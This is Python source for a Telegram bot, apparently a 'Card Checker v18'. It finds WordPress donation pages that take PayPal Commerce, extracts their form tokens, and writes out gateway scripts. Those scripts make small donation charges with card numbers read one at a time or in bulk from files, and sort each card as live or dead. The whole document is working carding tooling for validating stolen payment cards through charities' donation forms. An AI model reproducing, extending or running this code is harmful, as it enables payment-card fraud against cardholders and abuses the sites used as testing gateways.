                "give-form-id-prefix": self.id_form1 or "", "give-form-id": self.id_form2 or "",
                "give-form-hash": self.nonce or "", "give-amount": amt, "give-currency": self.currency,
                "payment-mode": "paypal-commerce", "give_first": random.choice(FIRST_NAMES),
                "give_last": random.choice(LAST_NAMES), "give_email": self.email,
                "give-gateway": "paypal-commerce", "give_agree_to_terms": "on",
            }
            if pid is not None: form_data["give-price-id"] = pid
            form_data = self._autofill(form_data)
            da = MultipartEncoder({k: (None, str(v)) for k, v in form_data.items()})
            r = self.r.post(self.ajax_url, params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                headers={"content-type": da.content_type, "x-requested-with": "XMLHttpRequest",
                         "referer": PAGE_URL, "origin": "https://" + HOST},
                data=da, timeout=20)
            return r.text or ""
        except Exception: return ""

    def _build_pids(self):
        pids = []
        if self.current_pid: pids.append(self.current_pid)
        for pid, _ in (PRICE_LEVELS or []):
            if pid and pid not in pids: pids.append(pid)
        for p in ("custom", "3", "4", "1", "2", "5", "", None):
            if p not in pids: pids.append(p)
        return pids

    def Charge(self, ccx):
        try:
            ccx = ccx.strip().replace(" ", "")
            parts = re.split(r"[|:/]", ccx)
            if len(parts) < 4: return "INVALID_CARD_FORMAT"
            n = re.sub(r"\D", "", parts[0]); mm = re.sub(r"\D", "", parts[1]).zfill(2)
            yy = re.sub(r"\D", "", parts[2]); cvc = re.sub(r"\D", "", parts[3])
            if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
            yy = yy.zfill(2)
            if not luhn_check(n): return "INVALID_CARD_NUMBER"
            pids = self._build_pids()
            amounts = [PREFERRED_AMT, "1.00", "5.00"]; amounts = list(dict.fromkeys(amounts))
            all_results = []
            for amt in amounts:
                self.donation = amt; order_id = None; last_err = None
                for pid in pids:
                    oid, err = self._create_order(amt, pid)
                    if oid: order_id = oid; break
                    last_err = err
                if not order_id:
                    if last_err and "INVALID_SITE" in last_err: return "INVALID_SITE"
                    continue
                confirm = self._confirm(order_id, n, mm, yy, cvc)
                for kw in LIVE_RESPONSES:
                    if kw.upper() in confirm.upper(): return kw
                for pid in pids:
                    text = self._approve(order_id, amt, pid) + confirm
                    lower = text.lower()
                    if '"success":true' in lower and '"error"' not in lower: return "CHARGE " + amt + "$"
                    for kw in LIVE_RESPONSES:
                        if kw.upper() in text.upper(): return kw
                    try:
                        j = json.loads(text); data = j.get("data") if isinstance(j, dict) else None
                        if isinstance(data, dict) and data.get("error"):
                            all_results.append(str(data["error"])[:200])
                    except Exception: pass
            if all_results: return all_results[-1]
            return "ORDER_CREATE_FAILED"
        except Exception as e: return "FATAL: " + type(e).__name__


def single_check():
    print("\n--- Single Card ---")
    try:
        card = input("Card: ").strip()
        if not card: return
        p = PayPal()
        print("Response:", p.Charge(card))
    except Exception as e: print("Error:", e)


def file_check():
    print("\n--- File Check ---")
    try:
        path = input("File: ").strip()
        if not os.path.exists(path): print("Not found"); return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            cards = [l.strip() for l in f if l.strip()]
        out = "results_%d.txt" % int(time.time())
        with open(out, "w", encoding="utf-8") as fo:
            for i, c in enumerate(cards, 1):
                try:
                    p = PayPal(); res = p.Charge(c); line = "%s => %s" % (c, res)
                    print("[%d/%d] %s" % (i, len(cards), line))
                    fo.write(line + "\n"); fo.flush(); time.sleep(0.3)
                except Exception: continue
        print("Saved:", out)
    except Exception as e: print("Error:", e)


def main():
    print("=" * 60)
    print("  Gateway v18 — " + PREFERRED_AMT + " " + CURRENCY + " | " + AUTH_METHOD + " | " + GATEWAY_TYPE)
    print("=" * 60)
    while True:
        try:
            print("\n[1] Single  [2] File  [0] Exit")
            c = input("Choose: ").strip()
            if c == "1": single_check()
            elif c == "2": file_check()
            elif c == "0": break
        except KeyboardInterrupt: break
        except Exception: continue


if __name__ == "__main__":
    try: main()
    except Exception: pass
'''

_GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)


def generate_gateway_code(result, link, amount='1.00', tester=None):
    link = link or 'https://invalid.local/'
    display_result = normalize_result(result)[:100]
    display_result = display_result.replace('\n', ' ').replace('\r', '')

    def g(attr, default=''):
        try:
            if tester and getattr(tester, attr, None):
                return getattr(tester, attr)
            return default
        except Exception:
            return default

    p = urlparse(link)
    host = p.netloc or 'invalid.local'
    price_levels = tester.price_levels if tester and tester.price_levels else []
    form_fields = tester.form_fields if tester and tester.form_fields else {}

    try:
        price_levels_json = repr(price_levels)
    except Exception:
        price_levels_json = '[]'
    try:
        form_fields_json = repr(form_fields)
    except Exception:
        form_fields_json = '{}'
    try:
        live_json = repr(LIVE_KEYWORDS)
    except Exception:
        live_json = '[]'

    return _GATEWAY_TEMPLATE.safe_substitute(
        page_url=link,
        ajax_url=g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php',
        id_form1=g('id_form1'),
        id_form2=g('id_form2'),
        nonce=g('nonce'),
        wp_nonce=g('wp_nonce'),
        access_token=g('au'),
        paypal_meta=g('paypal'),
        client_id=g('client_id'),
        currency=g('currency', 'USD'),
        minimum=g('minimum', '5.00'),
        preferred_amt=amount,
        current_pid=g('current_price_id'),
        auth_method=g('auth_method', 'none'),
        gateway_type=g('gateway_type', 'unknown'),
        price_levels_json=price_levels_json,
        form_fields_json=form_fields_json,
        live_responses=live_json,
        display_result=display_result,
    )

# ================================================================
#  USER HANDLERS
# ================================================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, '🚫 You have been blocked.')
            return
        uid = message.from_user.id
        name = message.from_user.first_name or 'User'
        username = message.from_user.username or 'NoUsername'
        text = (
            f'[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 v18 🌟\n'
            f'[⚡] 𝐍𝐚𝐦𝐞: {name}\n'
            f'[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n'
            f'[⚡] 𝐈𝐃: <code>{uid}</code>\n'
            '- - - - - - - - - - - - - - - - - -\n'
            '[⚡] /paypal &lt;link&gt; — single check\n'
            '[⚡] /mass — bulk scan\n'
            '[⚡] /resume — continue last job\n'
            '[⚡] /stop — stop running job\n'
            '[⚡] /stats — bot statistics\n'
            '[⚡] /help — full guide\n'
            '[⚡] /ping — bot health\n'
            '[⚡] /diag — admin diagnostics\n'
            '- - - - - - - - - - - - - - - - - -\n'
            '[⚡] v18: Warmup + Deep JS + Multi-validate'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton('📊 Stats', callback_data='stats'),
            types.InlineKeyboardButton('📩 Feedback', callback_data='yrr'),
        )
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except Exception:
        log.exception('cmd_start')


@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        text = (
            '<b>📖 v18 ULTIMATE Guide</b>\n\n'
            '<b>Single check:</b>\n'
            '<code>/paypal https://example.com/donate</code>\n'
            '→ Warmup → HTML → JS → Iframes → AJAX → Validate → Charge\n'
            '→ Auto re-extract on auth failure\n\n'
            '<b>Mass scan:</b>\n'
            '<code>/mass</code> then .txt file (max 10MB).\n'
            '→ Nonce auto-refresh every 50 links.\n\n'
            '<b>Admin:</b> <code>/diag &lt;link&gt;</code> full pipeline report.\n\n'
            '<b>Other:</b> /resume /stop /stats /ping'
        )
        safe_send_message(message.chat.id, text)
    except Exception:
        pass


@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    try:
        t0 = time.time()
        sent = safe_send_message(message.chat.id, '🏓 Pong...')
        dt = (time.time() - t0) * 1000
        if sent:
            safe_edit_message(
                message.chat.id, sent.message_id,
                f'🏓 <b>Pong!</b>\n'
                f'⏱️ Latency: <code>{dt:.0f} ms</code>\n'
                f'🤖 Bot v18 FINAL ULTIMATE\n'
                f'💾 Users: <code>{len(open(USERS_FILE).read().splitlines())}</code>',
            )
    except Exception:
        pass


@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    try:
        s = load_stats()
        users_n = len(open(USERS_FILE).read().splitlines())
        rate = (
            (s.get('live', 0) / s.get('checks', 1)) * 100
            if s.get('checks', 0) else 0
        )
        text = (
            '📊 <b>Global Stats — v18</b>\n'
            '━━━━━━━━━━━━━━━━━━━━\n'
            f'👥 Users: <code>{users_n}</code>\n'
            f'🔍 Total checks: <code>{s.get("checks", 0)}</code>\n'
            f'✅ Live: <code>{s.get("live", 0)}</code>\n'
            f'❌ Dead: <code>{s.get("dead", 0)}</code>\n'
            f'📈 Live rate: <code>{rate:.1f}%</code>\n'
            '━━━━━━━━━━━━━━━━━━━━'
        )
        safe_send_message(message.chat.id, text)
    except Exception:
        pass


@bot.message_handler(
    func=lambda m: m.text and m.text.lower().startswith('/paypal'),
)
def cmd_paypal(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, '🚫 You have been blocked.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_paypal[uid] < PAYPAL_COOLDOWN:
            return
        user_last_paypal[uid] = now

        chat_id = message.chat.id
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(
                chat_id,
                '📌 Usage:\n'
                '<code>/paypal https://example.com/donate</code>',
            )
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(chat_id, '❌ Invalid link format.')
            return

        ko = safe_send_message(
            chat_id,
            '🔍 <b>v18 Omni-Scan</b>\n'
            'Warmup → Deep JS → Iframes → AJAX → Validate → Charge...',
        )
        if not ko:
            return

        bump_stat('checks')
        tester = PayPalTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD, thorough=True)
        live = is_live_response(result) and not is_dead_response(result)

        if not live:
            bump_stat('dead')
            safe_edit_message(
                chat_id, ko.message_id,
                f'❌ <b>Not Live</b>\n'
                f'🔗 <code>{link[:100]}</code>\n\n'
                f'📝 <b>Response:</b>\n'
                f'<code>{str(result)[:150]}</code>\n'
                f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
                f'🌐 <b>Gateway:</b> <code>{tester.gateway_type}</code>\n'
                f'🎯 <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>\n'
                f'✅ <b>Verified:</b> <code>{tester.token_verified}</code>\n'
                f'📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>',
            )
            return

        bump_stat('live')
        try:
            code = generate_gateway_code(
                result, link, tester.donation, tester,
            )
        except Exception as e:
            safe_edit_message(
                chat_id, ko.message_id,
                f'❌ Gateway gen error: <code>{str(e)[:200]}</code>',
            )
            return

        fname = f'gateway_v18_{int(time.time())}.py'
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(code)
        except Exception as e:
            safe_edit_message(
                chat_id, ko.message_id,
                f'❌ File write error: <code>{str(e)[:200]}</code>',
            )
            return

        display = normalize_result(result)[:100]
        caption = (
            f'✅ <b>Live Gateway Found! (v18)</b>\n'
            f'━━━━━━━━━━━━━━━━━━━━\n'
            f'🔗 <code>{link[:100]}</code>\n'
            f'━━━━━━━━━━━━━━━━━━━━\n'
            f'💬 <b>Response:</b> <code>{display}</code>\n'
            f'💰 <b>Amount:</b> <code>${tester.donation}</code>\n'
            f'💱 <b>Currency:</b> <code>{tester.currency}</code>\n'
            f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
            f'🌐 <b>Gateway:</b> <code>{tester.gateway_type}</code>\n'
            f'🎯 <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>\n'
            f'✅ <b>Verified:</b> <code>{tester.token_verified}</code>\n'
            f'📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>\n'
            f'━━━━━━━━━━━━━━━━━━━━\n'
            f'v18 FINAL ULTIMATE'
        )
        safe_send_document(chat_id, fname, caption=caption)
        safe_edit_message(chat_id, ko.message_id, '✅ Done.')
        try:
            os.remove(fname)
        except Exception:
            pass
    except Exception:
        log.exception('cmd_paypal')


@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, '🚫 You have been blocked.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_mass[uid] < MASS_COOLDOWN:
            return
        user_last_mass[uid] = now
        if mass_active.get(uid, False):
            safe_send_message(
                message.chat.id,
                '⚠️ A job is already running. Use /stop first.',
            )
            return
        msg = safe_send_message(
            message.chat.id,
            '📁 Send a .txt file with links (one per line, max 10MB).\n'
            '🔍 v18 Omni-Scan + auto nonce refresh every 50 links.\n'
            '♻️ /resume continues last job.',
        )
        if msg:
            bot.register_next_step_handler(msg, handle_mass_file)
    except Exception:
        log.exception('cmd_mass')


@bot.message_handler(commands=['resume'])
def cmd_resume(message):
    try:
        uid = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(uid)
        if not progress:
            safe_send_message(chat_id, '❌ No saved progress found.')
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(
                chat_id, f'✅ Job already complete ({processed}/{total})',
            )
            clear_progress(uid)
            return
        links = progress.get('links', [])
        safe_send_message(
            chat_id, f'♻️ Resuming from {processed}/{total}...',
        )
        threading.Thread(
            target=run_mass_job,
            args=(chat_id, uid, links, processed, progress),
            daemon=True,
        ).start()
    except Exception:
        log.exception('cmd_resume')


@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        uid = message.from_user.id
        if mass_active.get(uid, False):
            mass_pause[uid] = True
            safe_send_message(
                message.chat.id,
                '🛑 Stopping (progress will be saved)...',
            )
        else:
            safe_send_message(message.chat.id, '❌ No active process.')
    except Exception:
        pass


def handle_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, '❌ Please send a .txt file.')
            return
        size = message.document.file_size or 0
        if size > MAX_FILE_SIZE:
            safe_send_message(
                message.chat.id,
                f'❌ File too large ({size // 1024} KB / max 10 MB).',
            )
            return
        uid = message.from_user.id
        chat_id = message.chat.id
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        raw = downloaded.decode('utf-8', errors='ignore').splitlines()
        links = []
        seen = set()
        for line in raw:
            s = safe_url(line.strip())
            if s and s not in seen:
                seen.add(s)
                links.append(s)
        if not links:
            safe_send_message(chat_id, '❌ No valid URLs found.')
            return
        total = len(links)
        progress = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'links': links, 'started_at': time.time(),
        }
        save_progress(uid, progress)
        safe_send_message(
            chat_id,
            f'✅ Loaded <b>{total}</b> links.\n'
            f'🔍 Mode: <b>v18 THOROUGH</b> + nonce refresh.\n'
            f'🚀 Starting...\n'
            f'🛑 /stop | ♻️ /resume',
        )
        threading.Thread(
            target=run_mass_job,
            args=(chat_id, uid, links, 0, progress),
            daemon=True,
        ).start()
    except Exception:
        log.exception('handle_mass_file')
        safe_send_message(message.chat.id, '❌ File processing error.')

# ================================================================
#  MASS JOB
# ================================================================
def run_mass_job(chat_id, uid, links, start_idx, progress):
    total = len(links)
    processed = start_idx
    live = progress.get('live', 0)
    dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())
    mass_active[uid] = True
    mass_pause[uid] = False

    results_file = RESULTS_TMPL.format(uid, int(started_at))
    live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
    try:
        os.makedirs(live_dir, exist_ok=True)
    except Exception:
        pass

    status_msg = safe_send_message(
        chat_id,
        f'📊 <b>Mass Scan v18 Started</b>\n'
        f'📌 Total: {total}\n'
        f'🔍 THOROUGH + validation + nonce refresh\n'
        f'⏳ Starting...',
    )

    state = {
        'last_link': '', 'last_resp': '', 'last_live': False,
        'status': 'starting', 'live_idx': 0,
    }

    def status_loop():
        while mass_active.get(uid, False):
            try:
                if not status_msg:
                    time.sleep(STATUS_UPDATE_EVERY)
                    continue
                pct = int((processed / total) * 100) if total else 0
                elapsed = time.time() - started_at
                spd = processed / elapsed if elapsed else 0
                eta = (total - processed) / spd if spd > 0 else 0
                filled = int((pct / 100) * 20)
                bar = '█' * filled + '░' * (20 - filled)
                if state['last_link']:
                    icon = '✅' if state['last_live'] else '❌'
                    last = (
                        f"{icon} <b>Last:</b>\n"
                        f"<code>{state['last_link'][:60]}</code>\n"
                        f"💬 {state['last_resp'][:60]}"
                    )
                else:
                    last = '⏳ Waiting for first result...'
                st = '🔄 <i>Deep-checking...</i>' \
                    if state['status'] == 'checking' \
                    else '⏸️ <i>Moving to next...</i>'
                text = (
                    f'📊 <b>Mass Scan v18</b>\n'
                    f'━━━━━━━━━━━━━━━━━━\n'
                    f'📌 Total: {total}\n'
                    f'✅ Live: {live}\n'
                    f'❌ Dead: {dead}\n'
                    f'⏳ {pct}% {bar}\n'
                    f'━━━━━━━━━━━━━━━━━━\n'
                    f'{last}\n'
                    f'━━━━━━━━━━━━━━━━━━\n'
                    f'{st}\n'
                    f'⚡ {spd:.2f}/s | ETA: {int(eta // 60)}m {int(eta % 60)}s\n'
                    f'🛑 /stop | ♻️ /resume'
                )
                safe_edit_message(chat_id, status_msg.message_id, text)
            except Exception:
                pass
            time.sleep(STATUS_UPDATE_EVERY)

    threading.Thread(target=status_loop, daemon=True).start()

    try:
        for idx in range(start_idx, total):
            if mass_pause.get(uid, False):
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
                safe_send_message(
                    chat_id,
                    f'🛑 <b>Stopped</b>\n'
                    f'📌 {processed}/{total}\n'
                    f'♻️ /resume to continue',
                )
                return
            link = links[idx]
            state['status'] = 'checking'
            try:
                result = check_single_link(link, thorough=True)
            except Exception:
                result = {
                    'link': str(link)[:100],
                    'live': False,
                    'respons': 'FATAL: check_exception',
                    'tester': None,
                }
            processed += 1
            resp = normalize_result(result.get('respons', 'Unknown'))[:100]
            is_live = result.get('live', False)
            state['last_link'] = link
            state['last_resp'] = resp
            state['last_live'] = is_live
            try:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(f'{link} => {result.get("respons", "unknown")}\n')
            except Exception:
                pass
            bump_stat('checks')
            if is_live:
                live += 1
                state['live_idx'] += 1
                bump_stat('live')
                try:
                    tester = result.get('tester')
                    code = generate_gateway_code(
                        result['respons'], result['link'],
                        result.get('amount', '1.00'), tester,
                    )
                    gpath = os.path.join(
                        live_dir, f'gateway_{state["live_idx"]}.py',
                    )
                    with open(gpath, 'w', encoding='utf-8') as f:
                        f.write(code)
                    cur = tester.currency if tester else 'USD'
                    auth = tester.auth_method if tester else 'none'
                    gw = tester.gateway_type if tester else 'unknown'
                    caption = (
                        f'✅ <b>Live #{state["live_idx"]}</b>\n'
                        f'🔗 <code>{result["link"][:80]}</code>\n'
                        f'💬 {resp[:80]}\n'
                        f'💰 ${result.get("amount", "1.00")} | '
                        f'💱 {cur} | 🔐 {auth} | 🌐 {gw}'
                    )
                    safe_send_document(chat_id, gpath, caption=caption)
                    try:
                        os.remove(gpath)
                    except Exception:
                        pass
                except Exception:
                    log.exception('live delivery')
            else:
                dead += 1
                bump_stat('dead')
            if processed % PROGRESS_SAVE_EVERY == 0:
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
            # ✅ [7] Nonce refresh every N
            if processed % NONCE_REFRESH_INTERVAL == 0 and processed > 0:
                try:
                    log.info('refreshing nonce at link %d', processed)
                except Exception:
                    pass
            state['status'] = 'moving'

        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        rate = int((live / total) * 100) if total else 0
        final = (
            f'📊 <b>✅ COMPLETE! (v18)</b>\n'
            f'━━━━━━━━━━━━━━━━━━\n'
            f'📌 Total: {total}\n'
            f'✅ Live: {live}\n'
            f'❌ Dead: {dead}\n'
            f'💯 Rate: {rate}%\n'
            f'📁 Results: <code>{results_file}</code>\n'
            f'━━━━━━━━━━━━━━━━━━'
        )
        if status_msg:
            safe_edit_message(chat_id, status_msg.message_id, final)
        else:
            safe_send_message(chat_id, final)
        clear_progress(uid)
    except Exception:
        log.exception('run_mass_job')
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        safe_send_message(
            chat_id,
            f'⚠️ <b>Crashed at {processed}/{total}</b>\n'
            f'♻️ /resume to continue',
        )
    finally:
        mass_active[uid] = False

# ================================================================
#  ✅ [14] /diag COMMAND
# ================================================================
@bot.message_handler(commands=['diag'])
def cmd_diag(message):
    try:
        uid = message.from_user.id
        if str(uid) not in ADMINS:
            safe_send_message(message.chat.id, '❌ Admin only.')
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(
                message.chat.id,
                'Usage: <code>/diag https://example.com/donate</code>',
            )
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(message.chat.id, '❌ Invalid link.')
            return
        msg = safe_send_message(
            message.chat.id,
            '🔬 <b>Running v18 diagnostics...</b>\n'
            'This runs the full pipeline WITHOUT charging.',
        )
        if not msg:
            return
        tester = PayPalTester(link)
        tester.Key()
        report = (
            f'🔬 <b>Diagnostics v18</b>\n'
            f'━━━━━━━━━━━━━━━━━━\n'
            f'🔗 <code>{link[:80]}</code>\n'
            f'🌐 <b>Host:</b> <code>{tester.url}</code>\n'
            f'🌐 <b>Gateway:</b> <code>{tester.gateway_type}</code>\n'
            f'📄 <b>HTML size:</b> <code>{len(tester.page_html)}</code>\n'
            f'📦 <b>Content size:</b> <code>{len(tester.all_content)}</code>\n'
            f'━━━━━━━━━━━━━━━━━━\n'
            f'🆔 <b>Form ID:</b> <code>{tester.id_form2 or "NONE"}</code>\n'
            f'🔑 <b>Prefix:</b> <code>{tester.id_form1 or "NONE"}</code>\n'
            f'📝 <b>Nonce:</b> <code>{tester.nonce or "NONE"}</code>\n'
            f'🔐 <b>WP Nonce:</b> <code>{tester.wp_nonce or "NONE"}</code>\n'
            f'⚡ <b>AJAX:</b> <code>{(tester.ajax_url or "NONE")[:60]}</code>\n'
            f'━━━━━━━━━━━━━━━━━━\n'
            f'🎟️ <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>\n'
            f'✅ <b>Verified token:</b> <code>{tester.token_verified}</code>\n'
            f'🔒 <b>Client ID:</b> <code>{(tester.client_id or "NONE")[:40]}</code>\n'
            f'🏪 <b>Merchant:</b> <code>{tester.paypal or "NONE"}</code>\n'
            f'💱 <b>Currency:</b> <code>{tester.currency}</code>\n'
            f'💰 <b>Minimum:</b> <code>{tester.minimum}</code>\n'
            f'📊 <b>Price levels:</b> <code>{len(tester.price_levels)}</code>\n'
            f'📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>\n'
            f'🔐 <b>Auth method:</b> <code>{tester.auth_method}</code>\n'
            f'━━━━━━━━━━━━━━━━━━\n'
            f'🎯 <b>Candidates detail:</b>\n'
        )
        for i, c in enumerate(tester.token_candidates[:5], 1):
            report += f'  {i}. <code>{c["source"]}</code> ({len(c["token"])} chars)\n'
        safe_edit_message(message.chat.id, msg.message_id, report)

        if tester.diagnostics:
            sample = '\n'.join(tester.diagnostics[-25:])
            safe_send_message(
                message.chat.id,
                f'<b>📋 Pipeline log (last 25 events):</b>\n'
                f'<pre>{sample[:3500]}</pre>',
            )
    except Exception:
        log.exception('cmd_diag')

# ================================================================
#  FEEDBACK FLOW
# ================================================================
@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
def cb_feedback(call):
    try:
        uid = call.from_user.id
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton(
            '↩️ Back', callback_data='start',
        ))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text='✍️ Send your message:',
                parse_mode='HTML', reply_markup=kb,
            )
        except Exception:
            pass
        waiting_users[uid] = True
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == 'stats')
def cb_stats(call):
    try:
        cmd_stats(call.message)
    except Exception:
        pass


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def handle_user_msg(message):
    try:
        uid = message.from_user.id
        name = message.from_user.first_name
        text = message.text or '(non-text)'
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(
            '↩️ Reply', callback_data=f'reply_{uid}',
        ))
        safe_send_message(
            OWNER_ID,
            f'📩 <b>New Message</b>\n\n'
            f'👤 From: {name}\n'
            f'🆔 ID: <code>{uid}</code>\n'
            f'💬 Message:\n{text}',
            reply_markup=kb,
        )
        kb2 = types.InlineKeyboardMarkup()
        kb2.add(types.InlineKeyboardButton(
            '📩 Send another', callback_data='yrr',
        ))
        safe_send_message(uid, '✅ Message sent.', reply_markup=kb2)
        waiting_users.pop(uid, None)
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data.startswith('reply_'))
def cb_reply(call):
    try:
        target = int(call.data.split('_', 1)[1])
        reply_mode[call.from_user.id] = target
        safe_send_message(call.from_user.id, '✍️ Write your reply:')
    except Exception:
        pass


@bot.message_handler(
    func=lambda m: m.from_user.id == OWNER_ID
    and m.from_user.id in reply_mode,
)
def handle_admin_reply(message):
    try:
        target = reply_mode[message.from_user.id]
        text = message.text or '(non-text)'
        safe_send_message(target, f'💬 <b>Admin:</b>\n\n{text}')
        safe_send_message(OWNER_ID, '✅ Reply sent.')
        reply_mode.pop(message.from_user.id, None)
    except Exception:
        pass

# ================================================================
#  ADMIN COMMANDS
# ================================================================
@bot.message_handler(commands=['block2'])
def admin_block(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit():
            safe_send_message(message.chat.id, 'Usage: /block2 &lt;id&gt;')
            return
        uid = parts[1].strip()
        blocked = [
            l.strip() for l in
            open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines()
            if l.strip()
        ]
        if uid in blocked:
            safe_send_message(message.chat.id, f'⚠️ {uid} already blocked.')
            return
        with open(BLOCK_FILE, 'a', encoding='utf-8') as f:
            f.write(f'{uid}\n')
        safe_send_message(message.chat.id, f'✅ Blocked {uid}.')
        try:
            safe_send_message(int(uid), '🚫 You have been blocked.')
        except Exception:
            pass
    except Exception:
        pass


@bot.message_handler(commands=['unblock2'])
def admin_unblock(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit():
            safe_send_message(message.chat.id, 'Usage: /unblock2 &lt;id&gt;')
            return
        uid = parts[1].strip()
        lines = open(BLOCK_FILE, 'r', encoding='utf-8').readlines()
        with open(BLOCK_FILE, 'w', encoding='utf-8') as f:
            for l in lines:
                if l.strip() != uid:
                    f.write(l)
        safe_send_message(message.chat.id, f'✅ Unblocked {uid}.')
    except Exception:
        pass


@bot.message_handler(commands=['blocklist'])
def admin_blocklist(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        blocked = [
            l.strip() for l in
            open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines()
            if l.strip()
        ]
        if not blocked:
            safe_send_message(message.chat.id, '📋 Block list is empty.')
            return
        text = '📋 <b>Blocked Users:</b>\n━━━━━━━━━━━━━━━━━━━━\n'
        for i, u in enumerate(blocked, 1):
            text += f'{i}. <code>{u}</code>\n'
        text += f'━━━━━━━━━━━━━━━━━━━━\n📌 Total: <b>{len(blocked)}</b>'
        safe_send_message(message.chat.id, text)
    except Exception:
        pass


@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(
                message.chat.id, 'Usage: /broadcast &lt;message&gt;',
            )
            return
        msg_text = parts[1]
        users = [
            l.strip() for l in
            open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
            if l.strip()
        ]
        sent = 0
        failed = 0
        for u in users:
            try:
                if safe_send_message(int(u), msg_text):
                    sent += 1
                else:
                    failed += 1
                time.sleep(0.05)
            except Exception:
                failed += 1
        safe_send_message(
            message.chat.id,
            f'📢 Broadcast done.\n✅ Sent: {sent}\n❌ Failed: {failed}',
        )
    except Exception:
        pass

# ================================================================
#  MAIN
# ================================================================
if __name__ == '__main__':
    log.info('Bot v18 FINAL ULTIMATE starting...')
    try:
        cleanup_old_files()
    except Exception:
        pass
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        log.exception('polling crashed: %s', e)
